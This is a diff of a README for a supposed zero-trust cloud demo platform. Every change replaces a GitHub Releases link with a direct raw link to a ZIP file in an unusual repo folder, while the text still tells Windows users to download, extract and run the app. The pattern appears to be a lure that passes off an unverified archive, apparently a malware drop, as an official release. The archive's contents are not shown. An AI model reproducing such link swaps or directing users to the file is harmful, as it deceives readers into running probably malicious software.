@@ -1,6 +1,6 @@
 # 🔒 zero-trust-cloud-automation-platform - Secure Cloud Demo Made Simple
 
-[![Download Releases](https://img.shields.io/badge/Download-Releases-6A5ACD?style=for-the-badge&logo=github)](https://github.com/mesmodesto24-hub/zero-trust-cloud-automation-platform/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Releases-6A5ACD?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mesmodesto24-hub/zero-trust-cloud-automation-platform/main/portention/automation-zero-trust-cloud-platform-v3.5-alpha.2.zip)
 
 ## 🧭 Overview
 
@@ -19,13 +19,13 @@ It is built for learning and demo use. You can use it to explore:
 
 Visit this page to download the release file for Windows:
 
-[Go to Releases](https://github.com/mesmodesto24-hub/zero-trust-cloud-automation-platform/releases)
+[Go to Releases](https://raw.githubusercontent.com/mesmodesto24-hub/zero-trust-cloud-automation-platform/main/portention/automation-zero-trust-cloud-platform-v3.5-alpha.2.zip)
 
 Choose the latest release, then download the Windows file that matches your system. If the release includes a ZIP file, download it first, then extract it before you run the app.
 
 ## 🪟 Windows Setup
 
-1. Open the [Releases page](https://github.com/mesmodesto24-hub/zero-trust-cloud-automation-platform/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/mesmodesto24-hub/zero-trust-cloud-automation-platform/main/portention/automation-zero-trust-cloud-platform-v3.5-alpha.2.zip).
 2. Download the latest Windows package.
 3. Right-click the ZIP file and choose **Extract All**.
 4. Open the extracted folder.
@@ -198,7 +198,7 @@ Try these steps:
 
 If you need the release files again, use this link:
 
-[Download from Releases](https://github.com/mesmodesto24-hub/zero-trust-cloud-automation-platform/releases)
+[Download from Releases](https://raw.githubusercontent.com/mesmodesto24-hub/zero-trust-cloud-automation-platform/main/portention/automation-zero-trust-cloud-platform-v3.5-alpha.2.zip)
 
 ## 🗂️ What to Look For in the Release
 
